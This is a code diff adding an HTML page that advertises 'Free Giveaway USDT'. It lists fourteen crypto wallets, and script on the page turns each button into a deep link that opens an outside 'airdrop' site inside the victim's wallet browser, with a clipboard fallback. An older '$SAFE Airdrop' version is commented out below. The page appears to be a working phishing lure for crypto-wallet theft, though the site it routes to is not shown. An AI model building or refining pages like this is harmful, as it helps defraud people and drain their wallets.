@@ -3,6 +3,435 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GIVE AWAY | Claim USDT</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'><circle cx='50' cy='50' r='50' fill='%230C66FF'/><path d='M50 25 L25 68.3 L75 68.3 Z' fill='%23fff'/></svg>" />
+    <style>
+        :root {
+            --primary: #0C66FF;
+            --primary-hover: #2563EB;
+            --bg: #0B0F19;
+            --card-bg: #151A2A;
+            --text-main: #F8FAFC;
+            --text-muted: #94A3B8;
+            --border: #2A3143;
+            --accent-glow: rgba(12, 102, 255, 0.15);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            background-image: radial-gradient(circle at 50% 0%, #1a233a 0%, var(--bg) 60%);
+        }
+
+        .container {
+            background-color: var(--card-bg);
+            width: 100%;
+            max-width: 420px;
+            border-radius: 28px;
+            padding: 40px 24px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5), 0 0 0 1px var(--border);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #0C66FF, #00F0FF);
+        }
+
+        .live-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background-color: rgba(16, 185, 129, 0.1);
+            color: #10B981;
+            padding: 6px 12px;
+            border-radius: 999px;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            border: 1px solid rgba(16, 185, 129, 0.2);
+        }
+
+        .live-badge .dot {
+            width: 8px;
+            height: 8px;
+            background-color: #10B981;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
+            70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+
+        p.subtitle {
+            font-size: 15px;
+            color: var(--text-muted);
+            margin-bottom: 32px;
+            line-height: 1.6;
+        }
+
+        .wallet-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .wallet-btn {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            padding: 16px 20px;
+            background-color: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-main);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+        }
+
+        .wallet-btn:hover, .wallet-btn:active {
+            border-color: var(--primary);
+            background-color: var(--accent-glow);
+            transform: translateY(-2px);
+        }
+
+        .wallet-info {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .wallet-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            object-fit: cover;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+
+        .chevron {
+            color: var(--text-muted);
+            font-weight: bold;
+            font-size: 20px;
+            transition: color 0.2s ease;
+        }
+
+        .wallet-btn:hover .chevron {
+            color: var(--primary);
+        }
+
+        .divider {
+            height: 1px;
+            background-color: var(--border);
+            margin: 28px 0;
+            width: 100%;
+        }
+
+        .fallback-btn {
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 12px;
+            transition: color 0.2s ease;
+        }
+
+        .fallback-btn:hover {
+            color: var(--text-main);
+        }
+
+        #toast {
+            visibility: hidden;
+            min-width: 250px;
+            background-color: var(--primary);
+            color: #fff;
+            text-align: center;
+            border-radius: 12px;
+            padding: 14px;
+            position: fixed;
+            z-index: 100;
+            bottom: 30px;
+            font-size: 14px;
+            font-weight: 700;
+            opacity: 0;
+            box-shadow: 0 10px 25px rgba(12, 102, 255, 0.3);
+            transition: opacity 0.3s, bottom 0.3s;
+        }
+
+        #toast.show {
+            visibility: visible;
+            opacity: 1;
+            bottom: 50px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- <div class="live-badge">
+            <div class="dot"></div>
+            Airdrop is Live
+        </div> -->
+
+        <h1>Claim Your GIVEAWAY</h1>
+        <p class="subtitle">Select your native wallet to verify your on-chain activity and claim Free Giveaway USDT.</p>
+
+        <div class="wallet-list">
+            <a href="#" id="link-trust" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://avatars.githubusercontent.com/trustwallet" alt="Trust Wallet" class="wallet-icon">
+                    <span>Trust Wallet</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+            <a href="#" id="link-metamask" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="wallet-icon" style="background:#fff; padding:2px;">
+                    <span>MetaMask</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+            <a href="#" id="link-coinbase" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://avatars.githubusercontent.com/coinbase" alt="Coinbase" class="wallet-icon">
+                    <span>Coinbase Wallet</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+            <a href="#" id="link-safepal" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://avatars.githubusercontent.com/SafePal" alt="SafePal" class="wallet-icon">
+                    <span>SafePal</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+            <a href="#" id="link-tokenpocket" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://avatars.githubusercontent.com/TP-Lab" alt="TokenPocket" class="wallet-icon">
+                    <span>TokenPocket</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+            <a href="#" id="link-okx" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://avatars.githubusercontent.com/okx" alt="OKX Wallet" class="wallet-icon">
+                    <span>OKX Wallet</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+            <a href="#" id="link-bitget" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://avatars.githubusercontent.com/bitgetwallet" alt="Bitget Wallet" class="wallet-icon">
+                    <span>Bitget Wallet</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+            <a href="#" id="link-phantom" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://avatars.githubusercontent.com/phantom" alt="Phantom" class="wallet-icon">
+                    <span>Phantom</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+            <a href="#" id="link-binance" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://avatars.githubusercontent.com/binance" alt="Binance" class="wallet-icon">
+                    <span>Binance Web3</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+            <a href="#" id="link-rabby" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://avatars.githubusercontent.com/RabbyHub" alt="Rabby Wallet" class="wallet-icon">
+                    <span>Rabby Wallet</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+            <a href="#" id="link-rainbow" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://avatars.githubusercontent.com/rainbow-me" alt="Rainbow" class="wallet-icon">
+                    <span>Rainbow</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+            <a href="#" id="link-exodus" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://avatars.githubusercontent.com/ExodusMovement" alt="Exodus" class="wallet-icon">
+                    <span>Exodus</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+            <a href="#" id="link-ledger" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://avatars.githubusercontent.com/LedgerHQ" alt="Ledger" class="wallet-icon">
+                    <span>Ledger Live</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+            <a href="#" id="link-trezor" class="wallet-btn">
+                <div class="wallet-info">
+                    <img src="https://avatars.githubusercontent.com/trezor" alt="Trezor" class="wallet-icon">
+                    <span>Trezor</span>
+                </div>
+                <span class="chevron">›</span>
+            </a>
+
+        </div>
+
+        <div class="divider"></div>
+
+        <!-- <button class="fallback-btn" onclick="copyToClipboard()">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+            </svg>
+            Copy DApp Link Manually
+        </button> -->
+    </div>
+
+    <div id="toast">Link copied! Open in your wallet browser.</div>
+
+    <script>
+        // 🛠️ THE DYNAMIC SANITIZATION ENGINE (Untouched)
+        const TARGET_URL = "https://cryptosafe.network/airdrop"; 
+        
+        // Formats
+        const DAPP_URL_NO_HTTP = TARGET_URL.replace(/^https?:\/\//, '');
+        const ENCODED_URL = encodeURIComponent(TARGET_URL);
+
+        const tpParams = encodeURIComponent(JSON.stringify({
+            url: TARGET_URL,
+            chain: "ETH",
+            source: "dapp"
+        }));
+
+     document.addEventListener("DOMContentLoaded", () => {
+            // Existing Wallets
+            document.getElementById('link-trust').href = `https://link.trustwallet.com/open_url?coin_id=60&url=${ENCODED_URL}`;
+            document.getElementById('link-metamask').href = `https://metamask.app.link/dapp/${DAPP_URL_NO_HTTP}`;
+            document.getElementById('link-coinbase').href = `cbwallet://dapp?url=${ENCODED_URL}`;
+            document.getElementById('link-safepal').href = `safepal://dapp?url=${ENCODED_URL}`;
+            document.getElementById('link-tokenpocket').href = `tpdapp://open?params=${tpParams}`;
+            document.getElementById('link-okx').href = `okx://wallet/dapp/url?dappUrl=${ENCODED_URL}`;
+            document.getElementById('link-bitget').href = `bitkeep://macWeb3/dapp?url=${ENCODED_URL}`;
+            document.getElementById('link-phantom').href = `https://phantom.app/ul/browse/${ENCODED_URL}`;
+
+            // 🛠️ NEW WALLETS ROUTING LOGIC
+            // Binance Web3 Wallet (Uses Binance's internal DeFi DApp router)
+            document.getElementById('link-binance').href = `bnc://app.binance.com/defi/dapp?url=${ENCODED_URL}`;
+
+            // Rabby Mobile 
+            document.getElementById('link-rabby').href = `rabby://dapp?url=${ENCODED_URL}`;
+
+            // Rainbow Wallet (Universal Link)
+            document.getElementById('link-rainbow').href = `https://rnbwapp.com/dapp/${DAPP_URL_NO_HTTP}`;
+
+            // Exodus Mobile
+            document.getElementById('link-exodus').href = `exodus://dapp?url=${ENCODED_URL}`;
+
+            // Ledger Live (Uses Ledger's internal discover router)
+            document.getElementById('link-ledger').href = `ledgerlive://discover/dapp?url=${ENCODED_URL}`;
+
+            // Trezor Fallback
+            // Note: Trezor does not have a native mobile DApp browser like software wallets do. 
+            // We use a fallback trigger to copy the link so they can use it on desktop.
+            document.getElementById('link-trezor').addEventListener('click', (e) => {
+                e.preventDefault();
+                copyToClipboard();
+                alert("Trezor requires desktop connection. Link copied to clipboard!");
+            });
+        });
+
+        // The Manual Failsafe
+        function copyToClipboard() {
+            const textArea = document.createElement("textarea");
+            textArea.value = TARGET_URL;
+            document.body.appendChild(textArea);
+            textArea.select();
+            
+            try {
+                document.execCommand('copy');
+                showToast();
+            } catch (err) {
+                console.error('Failed to copy', err);
+            }
+            
+            document.body.removeChild(textArea);
+        }
+
+        function showToast() {
+            const toast = document.getElementById("toast");
+            toast.className = "show";
+            setTimeout(function(){ 
+                toast.className = toast.className.replace("show", ""); 
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
+
+
+
+<!-- <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>$SAFE Airdrop | Claim Allocation</title>
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'><circle cx='50' cy='50' r='50' fill='%230C66FF'/><path d='M50 25 L25 68.3 L75 68.3 Z' fill='%23fff'/></svg>" />
     <style>
@@ -423,4 +852,4 @@
         }
     </script>
 </body>
-</html>
+</html> -->
